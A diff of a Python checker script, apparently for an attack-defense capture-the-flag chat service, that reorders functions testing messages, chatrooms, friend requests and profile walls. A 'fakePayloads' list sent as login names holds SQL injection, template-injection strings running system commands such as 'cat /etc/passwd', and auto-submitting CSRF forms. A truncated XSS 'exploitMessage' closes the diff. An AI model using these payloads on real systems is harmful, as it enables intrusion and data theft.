@@ -216,6 +216,266 @@ async def getflag1(task: GetflagCheckerTaskMessage, client: AsyncClient, db: Cha
         logger.debug("Error finding " + task.flag + " in " + r.text)
         raise e
 
+
+@checker.putnoise(0)
+async def putnoise0(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
+                    logger: LoggerAdapter) -> None:
+    noise = generateNoise()
+    cookie, recipient = await register(task, client, secrets.token_hex(32), logger)
+    username, password, cookie = await sendMessage(task, client, recipient, noise, logger)
+    await chain_db.set("noise", (username, recipient, password, noise))
+
+
+@checker.getnoise(0)    
+async def getnoise0(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
+    try:
+        username, recipient, password, noise = await db.get("noise")
+    except KeyError:
+        raise MumbleException("Missing database entry from putnoise")
+    r, _ = await retrieveMessage(task, client, recipient, logger, username, password)
+    try:
+        assert_in(noise, unescape(r.text), "noise missing from messages")
+    except Exception as e:
+        logger.debug("Error finding " + noise + " in " + r.text)
+        raise e
+
+
+@checker.putnoise(1)
+async def putnoise1(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
+                    logger: LoggerAdapter) -> None:
+    noise = generateNoise()
+    password = secrets.token_hex(32)
+    cookie, username = await register(task, client, password, logger)
+    roomName = secrets.token_hex(10)
+    roomUrl = await createChatroom(task, roomName, True, client, cookie, logger)
+    logger.debug(f"Created public chatroom {roomName} with url {roomUrl}")
+    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
+    assert_equals(r.status_code, 200, "retrieving public chatroom failed")
+    r = await client.post(f"{getUrl(task)}/chatroom/{roomUrl}/messages", json={"message": noise}, cookies=cookie)
+    assert_equals(r.status_code, 302, "sending public chatroom message failed")
+    await chain_db.set("noise", (username, password, noise, roomUrl))
+
+
+@checker.getnoise(1)
+async def getnoise1(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
+    try:
+        username, password, noise, roomUrl = await db.get("noise")
+    except KeyError:
+        raise MumbleException("Missing database entry from putnoise")
+    cookie = await login(task, client, username, password, logger)
+    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
+    try:
+        assert_in(noise, unescape(r.text), "noise missing from public chatroom")
+    except Exception as e:
+        logger.debug("Error finding " + noise + " in " + r.text)
+        raise e
+    newUserCookie, username = await register(task, client, secrets.token_hex(32), logger)
+    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=newUserCookie)
+    assert_in(noise, unescape(r.text), "public chatroom preventing access to new user")
+
+
+@checker.putnoise(2)
+async def putnoise2(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
+                    logger: LoggerAdapter) -> None:
+    noise = generateNoise()
+    password = secrets.token_hex(32)
+    cookie, username = await register(task, client, password, logger)
+    roomName = secrets.token_hex(10)
+    roomUrl = await createChatroom(task, roomName, False, client, cookie, logger)
+    logger.debug(f"Created private chatroom {roomName} with url {roomUrl}")
+    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
+    assert_equals(r.status_code, 200, "retrieving private chatroom failed")
+    r = await client.post(f"{getUrl(task)}/chatroom/{roomUrl}/messages",
+                          json={"message": noise}, cookies=cookie)
+    assert_equals(r.status_code, 302, "sending private chatroom message failed")
+    await chain_db.set("noise", (username, password, noise, roomUrl))
+
+
+@checker.getnoise(2)
+async def getnoise2(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
+    try:
+        username, password, noise, roomUrl = await db.get("noise")
+    except KeyError:
+        raise MumbleException("Missing database entry from putnoise")
+    cookie = await login(task, client, username, password, logger)
+    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
+    try:
+        assert_in(noise, unescape(r.text), "noise missing from private chatroom")
+    except Exception as e:
+        logger.debug("Error finding " + noise + " in " + r.text)
+        raise e
+    newUserCookie, username = await register(task, client, secrets.token_hex(32), logger)
+    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=newUserCookie)
+    assert_in(noise, unescape(r.text), "private chatroom preventing access to new user")
+
+
+@checker.putnoise(3)
+async def putnoise3(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
+                    logger: LoggerAdapter) -> None:
+    password = secrets.token_hex(32)
+    cookie, username = await register(task, client, password, logger)
+    profilePic = random.choice(range(1, 50))
+    r = await client.post(f"{getUrl(task)}/profile-picture?pic={profilePic}", cookies=cookie)
+    assert_equals(r.status_code, 200, "setting profile picture failed")
+    await chain_db.set("noise", (username, password, profilePic))
+
+
+@checker.getnoise(3)
+async def getnoise3(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
+    try:
+        username, password, profilePic = await db.get("noise")
+    except KeyError:
+        raise MumbleException("Missing database entry from putnoise")
+    cookie = await login(task, client, username, password, logger)
+    r = await client.get(f"{getUrl(task)}", cookies=cookie)
+    assert_in(f"/assets/profile-pics/{profilePic}.jpg", r.text, "profile picture missing or incorrect at home")
+
+
+@checker.putnoise(4)
+async def putnoise4(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
+                    logger: LoggerAdapter) -> None:
+    password = secrets.token_hex(32)
+    noise = generateNoise()
+    cookie, username = await register(task, client, password, logger)
+    r = await client.post(f"{getUrl(task)}/profile/{username}/wall", json={'message': noise}, cookies=cookie)
+    assert_equals(json.loads(r.text), {'message': 'Message posted', 'status': 200}, "posting to wall failed")
+    await chain_db.set("noise", (username, password, noise))
+
+
+@checker.getnoise(4)
+async def getnoise4(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
+    try:
+        username, password, noise = await db.get("noise")
+    except KeyError:
+        raise MumbleException("Missing database entry from putnoise")
+    cookie = await login(task, client, username, password, logger)
+    r = await client.get(f"{getUrl(task)}/profile/{username}", cookies=cookie)
+    try:
+        assert_in(noise, unescape(r.text), "message missing from profile wall")
+    except Exception as e:
+        logger.debug("Error finding " + noise + " in " + r.text)
+        raise e
+
+
+@checker.putnoise(5)
+async def putnoise5(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
+                    logger: LoggerAdapter) -> None:
+    password = secrets.token_hex(32)
+    noise = generateNoise()
+    cookie, username = await register(task, client, password, logger)
+    partnerCookie, partner = await register(task, client, password, logger)
+    r = await client.get(f"{getUrl(task)}/profile/{partner}", cookies=cookie)
+    assert_in(f"You are not friends with this user", r.text, "profile page visible to non-friends")
+    r = await client.post(f"{getUrl(task)}/friends/requests",
+                          json={'userName': username, 'partner': partner, 'status': 'send'}, cookies=cookie)
+    assert_equals(r.status_code, 200, "sending friend request failed")
+    r = await client.get(f"{getUrl(task)}/profile/{partner}", cookies=cookie)
+    assert_in(f"You are not friends with this user", r.text, "profile page visible to requested friends")
+    r = await client.post(f"{getUrl(task)}/friends/requests",
+                          json={'userName': username, 'partner': partner, 'status': 'accept'}, cookies=partnerCookie)
+    assert_equals(r.status_code, 200, "accepting friend request failed")
+    r = await client.post(f"{getUrl(task)}/profile/{partner}/wall", json={'message': noise}, cookies=partnerCookie)
+    assert_equals(json.loads(r.text), {'message': 'Message posted', 'status': 200}, "posting to wall failed")
+    await chain_db.set("noise", (username, partner, password, noise))
+
+
+@checker.getnoise(5)
+async def getnoise5(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
+    try:
+        username, partner, password, noise = await db.get("noise")
+    except KeyError:
+        raise MumbleException("Missing database entry from putnoise")
+    cookie = await login(task, client, username, password, logger)
+    r = await client.get(f"{getUrl(task)}/profile/{partner}", cookies=cookie)
+    try:
+        assert_in(noise, unescape(r.text), "noise missing from profile wall")
+    except Exception as e:
+        logger.debug("Error finding " + noise + " in " + r.text)
+        raise e
+
+
+@checker.havoc(0)
+async def havoc0(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
+                 logger: LoggerAdapter) -> None:
+    username = name_fake.name().lower().replace(' ', '_') + str(random.randint(100001, 1000000))
+    password = secrets.token_hex(32)
+    r = await client.post(f"{getUrl(task)}/login", json={"username": username, "password": password})
+    assert_equals(r.status_code, 401, "login with invalid credentials succeeded")
+
+
+@checker.havoc(1)
+async def havoc1(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
+                 logger: LoggerAdapter) -> None:
+    username = secrets.token_hex(32)
+    password = secrets.token_hex(32)
+    r = await client.post(f"{getUrl(task)}/register",
+                          json={"username": username, "password": password, "confirmPassword": password})
+    assert_equals(r.status_code, 302, "register failed")
+    r = await client.post(f"{getUrl(task)}/register",
+                          json={"username": username, "password": password, "confirmPassword": password})
+    assert_equals(r.status_code, 400, "register with duplicate credentials succeeded")
+
+
+@checker.havoc(2)
+async def havoc2(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
+                 logger: LoggerAdapter) -> None:
+    password = secrets.token_hex(32)
+    cookie, username = await register(task, client, password, logger)
+    r = await client.get(f"{getUrl(task)}/profile/{username}", cookies=cookie)
+    assert_equals(r.status_code, 200, "getting profile failed")
+
+
+@checker.havoc(3)
+async def havoc3(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
+                 logger: LoggerAdapter) -> None:
+    password = secrets.token_hex(32)
+    encoded_message = encode(secrets.token_hex(32), secrets.token_hex(32), logger)
+    cookie, username = await register(task, client, password, logger)
+    r = await client.post(f"{getUrl(task)}/messages/",
+                          json={"recipient": secrets.token_hex(32), "message": encoded_message},
+                          cookies=cookie)
+    assert_equals(r.status_code, 404, "sending message to invalid recipient succeeded")
+
+
+@checker.havoc(4)
+async def havoc4(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
+                 logger: LoggerAdapter) -> None:
+    password = secrets.token_hex(32)
+    cookie, _ = await register(task, client, password, logger)
+    _, newUser = await register(task, client, password, logger)
+    r = await client.get(f"{getUrl(task)}/profile/{newUser}", cookies=cookie)
+    assert_equals(r.status_code, 400, "getting profile of non-friend succeeded")
+
+
+fakePayloads = [
+    "' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP \"^a.*\") THEN SLEEP(3) ELSE 1 END)); -- -",
+    "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
+    "{{[0]|reduce('system','id')}}",
+    "{{['id']|map('system')|join}}",
+    "{{['id']|filter('system')}}",
+    "{{['id',1]|sort('system')|join}}",
+    "{{['cat\x20/etc/passwd']|filter('system')}}",
+    "{{['cat$IFS/etc/passwd']|filter('system')}}",
+    "{{['id']|filter('passthru')}}",
+    "{['id']|map('passthru')}}",
+    """<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
+     <input name="username" type="hidden" value="CSRFd" />
+     <input type="submit" value="Submit Request" />
+    </form>
+    <script>
+     document.getElementById("autosubmit").submit();
+    </script>""",
+    "<a href=\"http://www.example.com/api/setusername?username=CSRFd\">Click Me</a>"
+]
+
+
+@checker.havoc(5)
+async def havoc5(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
+                 logger: LoggerAdapter) -> None:
+    password = secrets.token_hex(32)
+    await client.post(f"{getUrl(task)}/login",
+                      json={"username": fakePayloads[secrets.randbelow(len(fakePayloads))], "password": password})
+
 userAgents = [
     "Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36",
@@ -299,300 +559,15 @@ userAgents = [
 ]
 
 
-@checker.putnoise(0)
-async def putnoise0(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
-                    logger: LoggerAdapter) -> None:
-    noise = generateNoise()
-    client.headers["User-Agent"] = random.choice(userAgents)
-    logger.debug(client.headers["User-Agent"])
-    cookie, recipient = await register(task, client, secrets.token_hex(32), logger)
-    username, password, cookie = await sendMessage(task, client, recipient, noise, logger)
-    await chain_db.set("noise", (username, recipient, password, noise))
-
-
-@checker.getnoise(0)    
-async def getnoise0(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
-    try:
-        username, recipient, password, noise = await db.get("noise")
-    except KeyError:
-        raise MumbleException("Missing database entry from putnoise")
-    client.headers["User-Agent"] = random.choice(userAgents)
-    logger.debug(client.headers["User-Agent"])
-    r, _ = await retrieveMessage(task, client, recipient, logger, username, password)
-    try:
-        assert_in(noise, unescape(r.text), "noise missing from messages")
-    except Exception as e:
-        logger.debug("Error finding " + noise + " in " + r.text)
-        raise e
-
-
-@checker.putnoise(1)
-async def putnoise1(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
-                    logger: LoggerAdapter) -> None:
-    client.headers["User-Agent"] = random.choice(userAgents)
-    logger.debug(client.headers["User-Agent"])
-    noise = generateNoise()
-    password = secrets.token_hex(32)
-    cookie, username = await register(task, client, password, logger)
-    roomName = secrets.token_hex(10)
-    roomUrl = await createChatroom(task, roomName, True, client, cookie, logger)
-    logger.debug(f"Created public chatroom {roomName} with url {roomUrl}")
-    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
-    assert_equals(r.status_code, 200, "retrieving public chatroom failed")
-    r = await client.post(f"{getUrl(task)}/chatroom/{roomUrl}/messages", json={"message": noise}, cookies=cookie)
-    assert_equals(r.status_code, 302, "sending public chatroom message failed")
-    await chain_db.set("noise", (username, password, noise, roomUrl))
-
-
-@checker.getnoise(1)
-async def getnoise1(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
-    try:
-        username, password, noise, roomUrl = await db.get("noise")
-    except KeyError:
-        raise MumbleException("Missing database entry from putnoise")
-    client.headers["User-Agent"] = random.choice(userAgents)
-    logger.debug(client.headers["User-Agent"])
-    cookie = await login(task, client, username, password, logger)
-    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
-    try:
-        assert_in(noise, unescape(r.text), "noise missing from public chatroom")
-    except Exception as e:
-        logger.debug("Error finding " + noise + " in " + r.text)
-        raise e
-    newUserCookie, username = await register(task, client, secrets.token_hex(32), logger)
-    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=newUserCookie)
-    assert_in(noise, unescape(r.text), "public chatroom preventing access to new user")
-
-
-@checker.putnoise(2)
-async def putnoise2(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
-                    logger: LoggerAdapter) -> None:
-    client.headers["User-Agent"] = random.choice(userAgents)
-    logger.debug(client.headers["User-Agent"])
-    noise = generateNoise()
-    password = secrets.token_hex(32)
-    cookie, username = await register(task, client, password, logger)
-    roomName = secrets.token_hex(10)
-    roomUrl = await createChatroom(task, roomName, False, client, cookie, logger)
-    logger.debug(f"Created private chatroom {roomName} with url {roomUrl}")
-    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
-    assert_equals(r.status_code, 200, "retrieving private chatroom failed")
-    r = await client.post(f"{getUrl(task)}/chatroom/{roomUrl}/messages",
-                          json={"message": noise}, cookies=cookie)
-    assert_equals(r.status_code, 302, "sending private chatroom message failed")
-    await chain_db.set("noise", (username, password, noise, roomUrl))
-
-
-@checker.getnoise(2)
-async def getnoise2(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
-    try:
-        username, password, noise, roomUrl = await db.get("noise")
-    except KeyError:
-        raise MumbleException("Missing database entry from putnoise")
-    client.headers["User-Agent"] = random.choice(userAgents)
-    logger.debug(client.headers["User-Agent"])
-    cookie = await login(task, client, username, password, logger)
-    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=cookie)
-    try:
-        assert_in(noise, unescape(r.text), "noise missing from private chatroom")
-    except Exception as e:
-        logger.debug("Error finding " + noise + " in " + r.text)
-        raise e
-    newUserCookie, username = await register(task, client, secrets.token_hex(32), logger)
-    r = await client.get(f"{getUrl(task)}/chatroom/{roomUrl}", cookies=newUserCookie)
-    assert_in(noise, unescape(r.text), "private chatroom preventing access to new user")
-
-
-@checker.putnoise(3)
-async def putnoise3(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
-                    logger: LoggerAdapter) -> None:
-    client.headers["User-Agent"] = random.choice(userAgents)
-    logger.debug(client.headers["User-Agent"])
-    password = secrets.token_hex(32)
-    cookie, username = await register(task, client, password, logger)
-    profilePic = random.choice(range(1, 50))
-    r = await client.post(f"{getUrl(task)}/profile-picture?pic={profilePic}", cookies=cookie)
-    assert_equals(r.status_code, 200, "setting profile picture failed")
-    await chain_db.set("noise", (username, password, profilePic))
-
-
-@checker.getnoise(3)
-async def getnoise3(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
-    try:
-        username, password, profilePic = await db.get("noise")
-    except KeyError:
-        raise MumbleException("Missing database entry from putnoise")
-    client.headers["User-Agent"] = random.choice(userAgents)
-    logger.debug(client.headers["User-Agent"])
-    cookie = await login(task, client, username, password, logger)
-    r = await client.get(f"{getUrl(task)}", cookies=cookie)
-    assert_in(f"/assets/profile-pics/{profilePic}.jpg", r.text, "profile picture missing or incorrect at home")
-
-
-@checker.putnoise(4)
-async def putnoise4(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
-                    logger: LoggerAdapter) -> None:
-    client.headers["User-Agent"] = random.choice(userAgents)
-    logger.debug(client.headers["User-Agent"])
-    password = secrets.token_hex(32)
-    noise = generateNoise()
-    cookie, username = await register(task, client, password, logger)
-    r = await client.post(f"{getUrl(task)}/profile/{username}/wall", json={'message': noise}, cookies=cookie)
-    assert_equals(json.loads(r.text), {'message': 'Message posted', 'status': 200}, "posting to wall failed")
-    await chain_db.set("noise", (username, password, noise))
-
-
-@checker.getnoise(4)
-async def getnoise4(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
-    try:
-        username, password, noise = await db.get("noise")
-    except KeyError:
-        raise MumbleException("Missing database entry from putnoise")
-    client.headers["User-Agent"] = random.choice(userAgents)
-    logger.debug(client.headers["User-Agent"])
-    cookie = await login(task, client, username, password, logger)
-    r = await client.get(f"{getUrl(task)}/profile/{username}", cookies=cookie)
-    try:
-        assert_in(noise, unescape(r.text), "message missing from profile wall")
-    except Exception as e:
-        logger.debug("Error finding " + noise + " in " + r.text)
-        raise e
-
-
-@checker.putnoise(5)
-async def putnoise5(task: PutnoiseCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
-                    logger: LoggerAdapter) -> None:
-    client.headers["User-Agent"] = random.choice(userAgents)
-    logger.debug(client.headers["User-Agent"])
-    password = secrets.token_hex(32)
-    noise = generateNoise()
-    cookie, username = await register(task, client, password, logger)
-    partnerCookie, partner = await register(task, client, password, logger)
-    r = await client.get(f"{getUrl(task)}/profile/{partner}", cookies=cookie)
-    assert_in(f"You are not friends with this user", r.text, "profile page visible to non-friends")
-    r = await client.post(f"{getUrl(task)}/friends/requests",
-                          json={'userName': username, 'partner': partner, 'status': 'send'}, cookies=cookie)
-    assert_equals(r.status_code, 200, "sending friend request failed")
-    r = await client.get(f"{getUrl(task)}/profile/{partner}", cookies=cookie)
-    assert_in(f"You are not friends with this user", r.text, "profile page visible to requested friends")
-    r = await client.post(f"{getUrl(task)}/friends/requests",
-                          json={'userName': username, 'partner': partner, 'status': 'accept'}, cookies=partnerCookie)
-    assert_equals(r.status_code, 200, "accepting friend request failed")
-    r = await client.post(f"{getUrl(task)}/profile/{partner}/wall", json={'message': noise}, cookies=partnerCookie)
-    assert_equals(json.loads(r.text), {'message': 'Message posted', 'status': 200}, "posting to wall failed")
-    await chain_db.set("noise", (username, partner, password, noise))
-
-
-@checker.getnoise(5)
-async def getnoise5(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
-    try:
-        username, partner, password, noise = await db.get("noise")
-    except KeyError:
-        raise MumbleException("Missing database entry from putnoise")
-    client.headers["User-Agent"] = random.choice(userAgents)
-    logger.debug(client.headers["User-Agent"])
-    cookie = await login(task, client, username, password, logger)
-    r = await client.get(f"{getUrl(task)}/profile/{partner}", cookies=cookie)
-    try:
-        assert_in(noise, unescape(r.text), "noise missing from profile wall")
-    except Exception as e:
-        logger.debug("Error finding " + noise + " in " + r.text)
-        raise e
-
-
-@checker.havoc(0)
-async def havoc0(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
-                 logger: LoggerAdapter) -> None:
-    client.headers["User-Agent"] = random.choice(userAgents)
-    logger.debug(client.headers["User-Agent"])
-    username = name_fake.name().lower().replace(' ', '_') + str(random.randint(100001, 1000000))
-    password = secrets.token_hex(32)
-    r = await client.post(f"{getUrl(task)}/login", json={"username": username, "password": password})
-    assert_equals(r.status_code, 401, "login with invalid credentials succeeded")
-
-
-@checker.havoc(1)
-async def havoc1(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
+@checker.havoc(6)
+async def havoc6(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
                  logger: LoggerAdapter) -> None:
     client.headers["User-Agent"] = random.choice(userAgents)
     logger.debug(client.headers["User-Agent"])
     username = secrets.token_hex(32)
     password = secrets.token_hex(32)
-    r = await client.post(f"{getUrl(task)}/register",
-                          json={"username": username, "password": password, "confirmPassword": password})
-    assert_equals(r.status_code, 302, "register failed")
-    r = await client.post(f"{getUrl(task)}/register",
-                          json={"username": username, "password": password, "confirmPassword": password})
-    assert_equals(r.status_code, 400, "register with duplicate credentials succeeded")
-
-
-@checker.havoc(2)
-async def havoc2(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
-                 logger: LoggerAdapter) -> None:
-    client.headers["User-Agent"] = random.choice(userAgents)
-    logger.debug(client.headers["User-Agent"])
-    password = secrets.token_hex(32)
-    cookie, username = await register(task, client, password, logger)
-    r = await client.get(f"{getUrl(task)}/profile/{username}", cookies=cookie)
-    assert_equals(r.status_code, 200, "getting profile failed")
-
-
-@checker.havoc(3)
-async def havoc3(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
-                 logger: LoggerAdapter) -> None:
-    client.headers["User-Agent"] = random.choice(userAgents)
-    logger.debug(client.headers["User-Agent"])
-    password = secrets.token_hex(32)
-    encoded_message = encode(secrets.token_hex(32), secrets.token_hex(32), logger)
-    cookie, username = await register(task, client, password, logger)
-    r = await client.post(f"{getUrl(task)}/messages/",
-                          json={"recipient": secrets.token_hex(32), "message": encoded_message},
-                          cookies=cookie)
-    assert_equals(r.status_code, 404, "sending message to invalid recipient succeeded")
-
-
-@checker.havoc(4)
-async def havoc4(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
-                 logger: LoggerAdapter) -> None:
-    client.headers["User-Agent"] = random.choice(userAgents)
-    logger.debug(client.headers["User-Agent"])
-    password = secrets.token_hex(32)
-    cookie, _ = await register(task, client, password, logger)
-    _, newUser = await register(task, client, password, logger)
-    r = await client.get(f"{getUrl(task)}/profile/{newUser}", cookies=cookie)
-    assert_equals(r.status_code, 400, "getting profile of non-friend succeeded")
-
-
-fakePayloads = [
-    "' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP \"^a.*\") THEN SLEEP(3) ELSE 1 END)); -- -",
-    "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
-    "{{[0]|reduce('system','id')}}",
-    "{{['id']|map('system')|join}}",
-    "{{['id']|filter('system')}}",
-    "{{['id',1]|sort('system')|join}}",
-    "{{['cat\x20/etc/passwd']|filter('system')}}",
-    "{{['cat$IFS/etc/passwd']|filter('system')}}",
-    "{{['id']|filter('passthru')}}",
-    "{['id']|map('passthru')}}",
-    """<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
-     <input name="username" type="hidden" value="CSRFd" />
-     <input type="submit" value="Submit Request" />
-    </form>
-    <script>
-     document.getElementById("autosubmit").submit();
-    </script>""",
-    "<a href=\"http://www.example.com/api/setusername?username=CSRFd\">Click Me</a>"
-]
-
-
-@checker.havoc(5)
-async def havoc5(task: HavocCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB,
-                 logger: LoggerAdapter) -> None:
-    client.headers["User-Agent"] = random.choice(userAgents)
-    logger.debug(client.headers["User-Agent"])
-    password = secrets.token_hex(32)
-    await client.post(f"{getUrl(task)}/login",
-                      json={"username": fakePayloads[secrets.randbelow(len(fakePayloads))], "password": password})
+    r = await client.post(f"{getUrl(task)}/register", json={"username": username, "password": password, "confirmPassword": password})
+    assert_equals(r.status_code, 302)
 
 
 exploitMessage = "<script>function getText(){{let text='';let messages = document.getElementsByClassName(" \
